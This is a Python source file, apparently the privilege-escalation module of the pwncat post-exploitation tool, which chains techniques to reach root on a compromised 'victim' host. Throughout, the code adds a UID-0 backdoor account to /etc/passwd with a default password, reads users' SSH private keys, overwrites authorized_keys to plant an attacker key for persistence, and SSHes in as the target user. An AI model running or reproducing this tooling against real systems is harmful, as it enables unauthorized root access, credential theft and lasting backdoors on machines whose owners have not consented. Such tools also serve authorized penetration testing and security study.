#!/usr/bin/env python3
import crypt
import dataclasses
import ipaddress
import os
import pkgutil
import time
from typing import List, Tuple, Optional, Any

from colorama import Fore
from prompt_toolkit.shortcuts import confirm

import pwncat
from pwncat import util
from pwncat.enumerate.private_key import PrivateKeyFact
from pwncat.file import RemoteBinaryPipe
from pwncat.gtfobins import Capability


class PrivescError(Exception):
    """ An error occurred while attempting a privesc technique """


class Finder:
    """ Locate a privesc chain which ends with the given user. If `depth` is
    supplied, stop searching at `depth` techniques. If `depth` is not supplied
    or is negative, search until all techniques are exhausted or a chain is
    found. If `user` is not provided, depth is forced to `1`, and all methods
    to privesc to that user are returned. """

    DEFAULT_BACKDOOR_NAME = "pwncat"
    DEFAULT_BACKDOOR_PASS = "pwncat"

    def __init__(self):
        """ Create a new privesc finder """

        # A user we added_lines which has UID=0 privileges
        self.backdoor_user = None
        self.methods: List["BaseMethod"] = []

        # Load all the methods under this directory
        self.load_package(__path__)

    def load_package(self, path: list):

        for loader, module_name, is_pkg in pkgutil.walk_packages(path):
            method_module = loader.find_module(module_name).load_module(module_name)

            if is_pkg:
                continue

            if getattr(method_module, "Method", None) is None:
                # This isn't a privesc method. It shouldn't be in this directory
                continue

            try:
                method_module.Method.check()
                self.methods.append(method_module.Method())
            except PrivescError:
                pass

    def search(self, target_user: str = None) -> List["Technique"]:
        """ Search for privesc techniques for the current user to get to the
        target user. If target_user is not specified, all techniques for all
        users will be returned. """

        techniques = []
        for method in self.methods:
            try:
                techniques.extend(method.enumerate())
            except PrivescError:
                pass

        if target_user is not None:
            techniques = [
                technique for technique in techniques if technique.user == target_user
            ]

        return techniques

    def add_backdoor(self):
        """ Add the backdoor user if it doesn't already exist. This is normally
        called in order to solidify full UID=0 access (e.g. when SUID binaries
        yield a EUID=0 but UID!=0. """

        pwncat.victim.reload_users()

        if pwncat.victim.config["backdoor_user"] not in pwncat.victim.users:

            # Read /etc/passwd
            with pwncat.victim.open("/etc/passwd", "r") as filp:
                lines = filp.readlines()

            # Add a new user
            password = crypt.crypt(pwncat.victim.config["backdoor_pass"])
            user = pwncat.victim.config["backdoor_user"]
            lines.append(f"{user}:{password}:0:0::/root:{pwncat.victim.shell}\n")

            # Prepare data for transmission
            data = "".join(lines)

            # Write the data. Giving open the length opens up some other writing
            # options from GTFObins
            with pwncat.victim.open("/etc/passwd", "w", length=len(data)) as filp:
                filp.write(data)

            # Reload the /etc/passwd data
            pwncat.victim.reload_users()

            if pwncat.victim.config["backdoor_user"] not in pwncat.victim.users:
                raise PrivescError("/etc/passwd update failed!")

            # Log our tamper
            pwncat.victim.tamper.modified_file("/etc/passwd", added_lines=lines[-1:])

        pwncat.victim.run(f"su {pwncat.victim.config['backdoor_user']}", wait=False)
        pwncat.victim.recvuntil(": ")
        pwncat.victim.flush_output()

        pwncat.victim.client.send(
            pwncat.victim.config["backdoor_pass"].encode("utf-8") + b"\n"
        )
        pwncat.victim.run("echo")

    def write_file(
        self,
        filename: str,
        data: bytes,
        safe: bool = True,
        target_user: str = None,
        depth: int = None,
        chain: List["Technique"] = [],
        starting_user=None,
    ):

        if target_user is None:
            target_user = "root"

        current_user = pwncat.victim.current_user
        if (
            target_user == current_user.name
            or current_user.id == 0
            or current_user.name == "root"
        ):
            with pwncat.victim.open(filename, "wb", length=len(data)) as filp:
                filp.write(data)
            return chain

        if starting_user is None:
            starting_user = current_user

        if depth is not None and len(chain) > depth:
            raise PrivescError("max depth reached")

        # Enumerate escalation options for this user
        user_map = {}
        try:
            data_printable = data.decode("utf-8").isprintable()
        except UnicodeDecodeError:
            data_printable = False

        for method in self.methods:
            try:
                found_techniques = method.enumerate(Capability.ALL)
                for tech in found_techniques:
                    if (
                        tech.user == target_user
                        and Capability.WRITE in tech.capabilities
                    ):
                        try:
                            tech.method.write_file(filename, data, tech)
                            return chain
                        except PrivescError:
                            pass
                    if tech.user not in user_map:
                        user_map[tech.user] = []
                    user_map[tech.user].append(tech)
            except PrivescError:
                pass

        shlvl = pwncat.victim.getenv("SHLVL")

        # We can't escalate directly to the target to read a file. So, try recursively
        # against other users.
        for user, techniques in user_map.items():
            if user == target_user:
                continue
            if self.in_chain(user, chain):
                continue
            try:
                tech, exit_command = self.escalate_single(techniques, shlvl)
                chain.append((tech, exit_command))
            except PrivescError:
                continue
            try:
                return self.write_file(
                    filename, data, safe, target_user, depth, chain, starting_user
                )
            except PrivescError:
                tech, exit_command = chain[-1]
                pwncat.victim.run(exit_command, wait=False)
                chain.pop()

        raise PrivescError(f"no route to {target_user} found")

    def read_file(
        self,
        filename: str,
        target_user: str = None,
        depth: int = None,
        chain: List["Technique"] = [],
        starting_user=None,
    ):

        if target_user is None:
            target_user = "root"

        current_user = pwncat.victim.current_user
        if (
            target_user == current_user.name
            or current_user.id == 0
            or current_user.name == "root"
        ):
            pipe = pwncat.victim.open(filename, "rb")
            # this also offers the technique used:
            # escalate to user w/ shell & read normally
            return pipe, chain, chain[-1][0]

        if starting_user is None:
            starting_user = current_user

        if depth is not None and len(chain) > depth:
            raise PrivescError("max depth reached")

        # Enumerate escalation options for this user
        user_map = {}
        for method in self.methods:
            try:
                found_techniques = method.enumerate(Capability.ALL)
                for tech in found_techniques:
                    if tech.user == target_user and (
                        tech.capabilities & Capability.READ
                    ):
                        try:
                            read_pipe = tech.method.read_file(filename, tech)
                            return (read_pipe, chain, tech)
                        except PrivescError:
                            pass
                    if tech.user not in user_map:
                        user_map[tech.user] = []
                    user_map[tech.user].append(tech)
            except PrivescError:
                pass

        shlvl = pwncat.victim.getenv("SHLVL")

        # We can't escalate directly to the target to read a file. So, try recursively
        # against other users.
        for user, techniques in user_map.items():
            if user == target_user:
                continue
            if self.in_chain(user, chain):
                continue
            try:
                tech, exit_command = self.escalate_single(techniques, shlvl)
                chain.append((tech, exit_command))
            except PrivescError:
                continue
            try:
                return self.read_file(
                    filename, target_user, depth, chain, starting_user
                )
            except PrivescError:
                tech, exit_command = chain[-1]
                pwncat.victim.run(exit_command, wait=False)
                chain.pop()

        raise PrivescError(f"no route to {target_user} found")

    def escalate_single(
        self, techniques: List["Technique"], shlvl: str
    ) -> Tuple[Optional["Technique"], str]:
        """ Use the given list of techniques to escalate to the user. All techniques
        should be for the same user. This method will attempt a variety of privesc
        methods. Primarily, it will directly execute any techniques which provide
        the SHELL capability first. Afterwards, it will try to backdoor /etc/passwd
        if the target user is root. Lastly, it will try to escalate using a local
        SSH server combined with READ/WRITE capabilities to gain a local shell.

        This is, by far, the most disgusting function in all of `pwncat`. I'd like
        to clean it up, but I'm not sure how to break this up. It's all one continuous
        line of logic. It's meant to implement all possible privilege escalation methods
        for one user given a list of techniques for that user. The largest chunk of this
        is the SSH part, which needs to check that SSH exists, then try various methods
        to either leak or write private keys for the given user.
        """

        readers: List[Technique] = []
        writers: List[Technique] = []

        for technique in techniques:
            if Capability.SHELL in technique.capabilities:
                try:
                    util.progress(f"attempting {technique}")

                    # Attempt our basic, known technique
                    exit_script = technique.method.execute(technique)
                    pwncat.victim.flush_output(some=True)

                    # Reset the terminal to ensure we are stable
                    time.sleep(0.1)  # This seems inevitable for some privescs...
                    pwncat.victim.reset(hard=False)

                    # Check that we actually succeeded
                    current = pwncat.victim.update_user()

                    if current == technique.user or (
                        technique.user == pwncat.victim.config["backdoor_user"]
                        and current == "root"
                    ):
                        util.progress(f"{technique} succeeded!")
                        pwncat.victim.flush_output()
                        return technique, exit_script

                    # Check if we ended up in a sub-shell without escalating
                    if pwncat.victim.getenv("SHLVL") != shlvl:

                        # Get out of this subshell. We don't need it
                        # pwncat.victim.process(exit_script, delim=False)

                        pwncat.victim.run(exit_script, wait=False)
                        time.sleep(0.1)  # Still inevitable for some privescs...
                        pwncat.victim.recvuntil("\n")

                        # Clean up whatever mess was left over
                        pwncat.victim.flush_output()

                        pwncat.victim.reset(hard=False)

                        shlvl = pwncat.victim.getenv("SHLVL")

                    # The privesc didn't work, but didn't throw an exception.
                    # Continue on as if it hadn't worked.
                except PrivescError:
                    pass
                except ValueError:
                    raise PrivescError
            if Capability.READ in technique.capabilities:
                readers.append(technique)
            if Capability.WRITE in technique.capabilities:
                writers.append(technique)

        if writers and writers[0].user == "root":

            # We need su to privesc w/ file write
            su_command = pwncat.victim.which("su", quote=True)
            if su_command is not None:

                # Grab the first writer
                writer = writers[0]

                # Read /etc/passwd
                with pwncat.victim.open("/etc/passwd", "r") as filp:
                    lines = filp.readlines()

                # Add a new user
                password = crypt.crypt(pwncat.victim.config["backdoor_pass"])
                user = pwncat.victim.config["backdoor_user"]
                lines.append(f"{user}:{password}:0:0::/root:{pwncat.victim.shell}\n")

                # Join the data back and encode it
                data = ("".join(lines)).encode("utf-8")

                # Write the data
                writer.method.write_file("/etc/passwd", data, writer)

                # Maybe help?
                pwncat.victim.run("echo")

                # Check that it succeeded
                users = pwncat.victim.reload_users()

                # Check if the new passwd file contained the file
                if user in users:
                    # Log our tamper of this file
                    pwncat.victim.tamper.modified_file(
                        "/etc/passwd", added_lines=lines[-1:]
                    )

                    pwncat.victim.users[user].password = pwncat.victim.config[
                        "backdoor_pass"
                    ]
                    self.backdoor_user = pwncat.victim.users[user]

                    # Switch to the new user
                    # pwncat.victim.process(f"su {user}", delim=False)
                    pwncat.victim.process(f"su {user}", delim=True)
                    pwncat.victim.recvuntil(": ")

                    pwncat.victim.client.send(
                        pwncat.victim.config["backdoor_pass"].encode("utf-8") + b"\n"
                    )

                    pwncat.victim.flush_output()

                    return writer, "exit"

        sshd_running = False
        for fact in pwncat.victim.enumerate.iter("system.service"):
            util.progress("enumerating services: {fact.data}")
            if "sshd" in fact.data.name and fact.data.state == "running":
                sshd_running = True

        if sshd_running:
            sshd_listening = True
            sshd_address = "127.0.0.1"
        else:
            sshd_listening = False
            sshd_address = None

        used_technique = None

        if sshd_running and sshd_listening:
            # We have an SSHD and we have a file read and a file write
            # technique. We can attempt to leverage this to use SSH to ourselves
            # and gain access as this user.
            util.progress(
                f"found {Fore.RED}sshd{Fore.RESET} listening at "
                f"{Fore.CYAN}{sshd_address}:22{Fore.RESET}"
            )

            authkeys_path = ".ssh/authorized_keys"

            try:
                with pwncat.victim.open("/etc/ssh/sshd_config", "r") as filp:
                    for line in filp:
                        if line.startswith("AuthorizedKeysFile"):
                            authkeys_path = line.strip().split()[-1]
            except PermissionError:
                # We couldn't read the file. Assume they are located in the default home directory location
                authkeys_path = ".ssh/authorized_keys"

            # AuthorizedKeysFile is normally relative to the home directory
            if not authkeys_path.startswith("/"):
                # Grab the user information from /etc/passwd
                home = pwncat.victim.users[techniques[0].user].homedir

                if home == "" or home is None:
                    raise PrivescError("no user home directory, can't add ssh keys")

                authkeys_path = os.path.join(home, authkeys_path)

            util.progress(
                f"found authorized keys at {Fore.CYAN}{authkeys_path}{Fore.RESET}"
            )

            authkeys = []
            privkey_path = None
            privkey = None
            if readers:
                reader = readers[0]
                with reader.method.read_file(authkeys_path, reader) as filp:
                    authkeys = [line.strip().decode("utf-8") for line in filp]

                # Some payloads will return the stderr of the file reader. Check
                # that the authorized_keys even existed
                if len(authkeys) == 1 and "no such file" in authkeys[0].lower():
                    authkeys = []

                # We need to read each of the users keys in the ".ssh" directory
                # to see if they contain a public key that is already allowed on
                # this machine. If so, we can read the private key and
                # authenticate without a password and without clobbering their
                # keys.
                ssh_key_glob = os.path.join(
                    pwncat.victim.users[reader.user].homedir, ".ssh", "*.pub"
                )
                # keys = pwncat.victim.run(f"ls {ssh_key_glob}").strip().decode("utf-8")
                keys = ["id_rsa.pub"]
                keys = [
                    os.path.join(pwncat.victim.users[reader.user].homedir, ".ssh", key)
                    for key in keys
                ]

                # Iterate over each public key found in the home directory
                for pubkey_path in keys:
                    if pubkey_path == "":
                        continue
                    util.progress(
                        f"checking if {Fore.CYAN}{pubkey_path}{Fore.RESET} "
                        "is an authorized key"
                    )
                    # Read the public key
                    with reader.method.read_file(pubkey_path, reader) as filp:
                        pubkey = filp.read().strip().decode("utf-8")
                    # Check if it matches
                    if pubkey in authkeys:
                        util.progress(
                            f"{Fore.GREEN}{os.path.basename(pubkey_path)}{Fore.RESET} "
                            f"is in {Fore.GREEN}{reader.user}{Fore.RESET} authorized keys"
                        )
                        # remove the ".pub" to find the private key
                        privkey_path = pubkey_path.replace(".pub", "")
                        # Make sure the private key exists
                        if (
                            b"no such file"
                            in pwncat.victim.run(f"file {privkey_path}").lower()
                        ):
                            util.progress(
                                f"{Fore.CYAN}{os.path.basename(pubkey_path)}{Fore.RESET} "
                                f"has no private key"
                            )
                            continue

                        util.progress(
                            f"download private key from {Fore.CYAN}{privkey_path}{Fore.RESET}"
                        )
                        with reader.method.read_file(privkey_path, reader) as filp:
                            privkey = filp.read().strip().decode("utf-8")

                        # The terminal adds \r most of the time. This is a text
                        # file so this is safe.
                        privkey = privkey.replace("\r\n", "\n")

                        # Ensure we remember that we found this user's private key!
                        pwncat.victim.enumerate.add_fact(
                            "private_key",
                            PrivateKeyFact(
                                pwncat.victim.users[reader.user].id,
                                privkey_path,
                                privkey,
                            ),
                            "pwncat.privesc.Finder",
                        )

                        used_technique = reader

                        break
                else:
                    privkey_path = None
                    privkey = None
            elif writers:
                util.warn(
                    "no readers found for {Fore.GREEN}{techniques[0].user}{Fore.RESET}"
                )
                util.warn(f"however, we do have a writer.")
                response = confirm(
                    "would you like to clobber their authorized keys? ", suffix="(y/N) "
                )
                if not response:
                    raise PrivescError("user aborted key clobbering")

            # If we don't already know a private key, then we need a writer
            if privkey_path is None and not writers:
                raise PrivescError("no writers available to add private keys")

            # Everything looks good so far. We are adding a new private key. so we
            # need to read in the private key and public key, then add the public
            # key to the user's authorized_keys. The next step will upload the
            # private key in any case.
            if privkey_path is None:

                writer = writers[0]

                # Write our private key to a random location
                with open(pwncat.victim.config["privkey"], "r") as src:
                    privkey = src.read()

                with open(pwncat.victim.config["privkey"] + ".pub", "r") as src:
                    pubkey = src.read().strip()

                # Add our public key to the authkeys
                authkeys.append(pubkey)

                # Write the file
                writer.method.write_file(
                    authkeys_path, ("\n".join(authkeys) + "\n").encode("utf-8"), writer
                )

                if len(readers) == 0:
                    # We couldn't read their authkeys, but log that we clobbered it.
                    # The user asked us to. At least create an un-removable tamper
                    # noting that we clobbered this file.
                    pwncat.victim.tamper.modified_file(authkeys_path)

                # We now have a persistence method for this user no matter where
                # we are coming from. We need to track this.
                pwncat.victim.persist.register("authorized_keys", writer.user)

                used_technique = writer

            # SSH private keys are annoying and **NEED** a newline
            privkey = privkey.strip() + "\n"

            with pwncat.victim.tempfile("w", length=len(privkey)) as dst:
                # Write the file with a nice progress bar
                dst.write(privkey)
                # Save the path to the private key. We don't need the original path,
                # if there was one, because the current user can't access the old
                # one directly.
                privkey_path = dst.name

            # Log that we created a file
            pwncat.victim.tamper.created_file(privkey_path)

            # Ensure the permissions are right so ssh doesn't freak out
            pwncat.victim.run(f"chmod 600 {privkey_path}")

            # Run ssh as the given user with our new private key
            util.progress(
                f"attempting {Fore.RED}ssh{Fore.RESET} to "
                f"localhost as {Fore.GREEN}{techniques[0].user}{Fore.RESET}"
            )
            ssh = pwncat.victim.which("ssh")

            # First, run a test to make sure we authenticate
            command = (
                f"{ssh} -i {privkey_path} -o StrictHostKeyChecking=no -o PasswordAuthentication=no "
                f"{techniques[0].user}@127.0.0.1"
            )
            output = pwncat.victim.run(f"{command} echo good")

            # Check if we succeeded
            if b"good" not in output:
                raise PrivescError("ssh private key failed")

            # Great! Call SSH again!
            pwncat.victim.process(command)

            # Pretty sure this worked!
            return used_technique, "exit"

        raise PrivescError(f"unable to achieve shell as {techniques[0].user}")

    def escalate(
        self,
        target_user: str = None,
        depth: int = None,
        chain: List["Technique"] = None,
        starting_user=None,
    ) -> List[Tuple["Technique", str]]:
        """ Search for a technique chain which will gain access as the given 
        user. """

        if chain is None:
            chain = []

        if target_user is None:
            target_user = "root"

        current_user = pwncat.victim.current_user
        if (
            target_user == current_user.name
            or current_user.id == 0
            or current_user.name == "root"
        ):
            raise PrivescError(f"you are already {current_user.name}")

        if starting_user is None:
            starting_user = current_user

        if depth is not None and len(chain) > depth:
            raise PrivescError("max depth reached")

        # Capture current shell level
        shlvl = pwncat.victim.getenv("SHLVL")

        # Check if we have a persistence method for this user
        util.progress(f"checking local persistence implants")
        for user, persist in pwncat.victim.persist.installed:
            if not persist.local or (user != target_user and user is not None):
                continue
            util.progress(
                f"checking local persistence implants: {persist.format(target_user)}"
            )
            # Attempt to escalate with the local persistence method
            if persist.escalate(target_user):

                # Stabilize the terminal
                pwncat.victim.reset(hard=False)

                # The method thought it worked, but didn't appear to
                if pwncat.victim.update_user() != target_user:
                    if pwncat.victim.getenv("SHLVL") != shlvl:
                        pwncat.victim.run("exit", wait=False)
                    continue

                # It worked!
                chain.append((f"persistence - {persist.format(target_user)}", "exit"))
                return chain

        # Enumerate escalation options for this user
        techniques = {}
        for method in self.methods:
            try:
                util.progress(f"evaluating {method} method")
                found_techniques = method.enumerate(
                    Capability.SHELL | Capability.WRITE | Capability.READ
                )
                for tech in found_techniques:
                    if tech.user not in techniques:
                        techniques[tech.user] = []
                    techniques[tech.user].append(tech)
            except PrivescError:
                pass

        # Try to escalate directly to the target if possible
        if target_user in techniques:
            try:
                tech, exit_command = self.escalate_single(
                    techniques[target_user], shlvl
                )
                pwncat.victim.reset(hard=False)
                pwncat.victim.update_user()
                chain.append((tech, exit_command))
                return chain
            except PrivescError:
                pass

        # Try to use persistence as other users
        util.progress(f"checking local persistence implants")
        for user, persist in pwncat.victim.persist.installed:
            if self.in_chain(user, chain):
                continue
            util.progress(
                f"checking local persistence implants: {persist.format(user)}"
            )
            if persist.escalate(user):

                # Ensure history and prompt are correct
                pwncat.victim.reset()

                # Update the current user
                if pwncat.victim.update_user() != user:
                    if pwncat.victim.getenv("SHLVL") != shlvl:
                        pwncat.victim.run("exit", wait=False)
                    continue

                chain.append((f"persistence - {persist.format(user)}", "exit"))

                try:
                    return self.escalate(target_user, depth, chain, starting_user)
                except PrivescError:
                    chain.pop()
                    pwncat.victim.run("exit", wait=False)

                # Don't retry later
                if user in techniques:
                    del techniques[user]

        # We can't escalate directly to the target. Instead, try recursively
        # against other users.
        for user, techs in techniques.items():
            if user == target_user:
                continue
            if self.in_chain(user, chain):
                continue
            try:
                tech, exit_command = self.escalate_single(techs, shlvl)
                chain.append((tech, exit_command))
                pwncat.victim.reset(hard=False)
                pwncat.victim.update_user()
            except PrivescError:
                continue
            try:
                return self.escalate(target_user, depth, chain, starting_user)
            except PrivescError:
                tech, exit_command = chain[-1]
                pwncat.victim.run(exit_command, wait=False)
                chain.pop()

        raise PrivescError(f"no route to {target_user} found")

    def in_chain(self, user: str, chain: List[Tuple["Technique", str]]) -> bool:
        """ Check if the given user is in the chain """
        for link in chain:
            if link[0].user == user:
                return True
        return False

    def unwrap(self, techniques: List[Tuple["Technique", str]]):
        # Work backwards to get back to the original shell
        for technique, exit in reversed(techniques):
            pwncat.victim.run(exit, wait=False)

        pwncat.victim.flush_output()

        # Reset the terminal to get to a sane prompt
        pwncat.victim.reset()


@dataclasses.dataclass
class Technique:
    """
    An individual technique which was found to be possible by a privilege escalation
    method.

    :param user: the user this technique provides access as
    :param method: the method this technique is associated with
    :param ident: method-specific identifier
    :param capabilities: a GTFObins capability this technique provides
    """

    # The user that this technique will move to
    user: str
    """ The user this technique provides access as """
    # The method that will be used
    method: "BaseMethod"
    """ The method which this technique is associated with """
    # The unique identifier for this method (can be anything, specific to the
    # method)
    ident: Any
    """ Method specific identifier. This can be anything the method needs
    to identify this specific technique. It can also be unused. """
    # The GTFObins capabilities required for this technique to work
    capabilities: Capability
    """ The GTFOBins capabilities this technique provides. """

    def __str__(self):
        cap_names = {
            "READ": "file read",
            "WRITE": "file write",
            "SHELL": "shell",
        }
        return (
            f"{Fore.MAGENTA}{cap_names.get(self.capabilities.name, 'unknown')}{Fore.RESET} "
            f"as {Fore.GREEN}{self.user}{Fore.RESET} via {self.method.get_name(self)}"
        )


class BaseMethod:
    """
    Generic privilege escalation method. You must implement at a minimum the enumerate
    method. Also, for any capabilities which you are capable of generating techniques for,
    you must implement the corresponding methods:

    * ``Capability.SHELL`` - ``execute``
    * ``Capability.READ`` - ``read_file``
    * ``Capability.WRITE`` - ``write_file``

    Further, you can also implement the ``check`` class method to verify applicability of
    this method to the remote victim and the ``get_name`` method to generate a printable
    representation of a given technique for this method (as seen in ``privesc`` output).
    """

    # Binaries which are needed on the remote host for this privesc
    name = "unknown"
    """ Name of this method """
    BINARIES = []
    """ List of binaries to verify presence in the default ``check`` method """

    @classmethod
    def check(cls) -> bool:
        """ Check if the given PTY connection can support this privesc """
        for binary in cls.BINARIES:
            if pwncat.victim.which(binary) is None:
                raise PrivescError(f"required remote binary not found: {binary}")

    def enumerate(self, capability: int = Capability.ALL) -> List[Technique]:
        """
        Enumerate all possible techniques known and possible on the remote host for
        this method. This should only enumerate techniques with overlapping capabilities
        as specified by the ``capability`` parameter.

        :param capability: the requested capabilities to enumerate
        :return: A list of potentially working techniques
        """
        raise NotImplementedError("no enumerate method implemented")

    def execute(self, technique: Technique) -> bytes:
        """
        Execute the given technique to gain a shell. This is only called for techniques
        providing the Capability.SHELL capability. If there is a problem with escalation,
        the shell should be returned to normal and a ``PrivescError`` should be raised.

        :param technique: the technique to execute
        :return: a bytes object which will exit the new shell
        """
        raise NotImplementedError("no execute method implemented")

    def read_file(self, filename: str, technique: Technique) -> RemoteBinaryPipe:
        """
        Open the given file for reading and return a file-like object, as the user
        specified in the technique. This is only called for techniques providing the
        Capability.READ capability. If an error occurs, a ``PrivescError`` should be
        raised with a description of the problem.

        :param filename: path to the remote file
        :param technique: the technique to utilize
        :return: Binary file-like object representing the remote file
        """
        raise NotImplementedError("no read_file implementation")

    def write_file(self, filename: str, data: bytes, technique: Technique):
        """
        Write the data to the given filename on the remote host as the user
        specified in the technique. This is only called for techniques providing the
        Capability.WRITE capability. If an error occurs, ``PrivescError`` should
        be raised with a description of the problem.

        This will overwrite the remote file if it exists!

        :param filename: the remote file name to write
        :param data: the data to write
        :param technique: the technique to user
        """
        raise NotImplementedError("no write_file implementation")

    def get_name(self, tech: Technique) -> str:
        """
        Generate a human-readable and formatted name for this method/technique
        combination.

        :param tech: a technique applicable to this object
        :return: a formatted string
        """
        return str(self)

    def __str__(self):
        return f"{Fore.RED}{self.name}{Fore.RESET}"
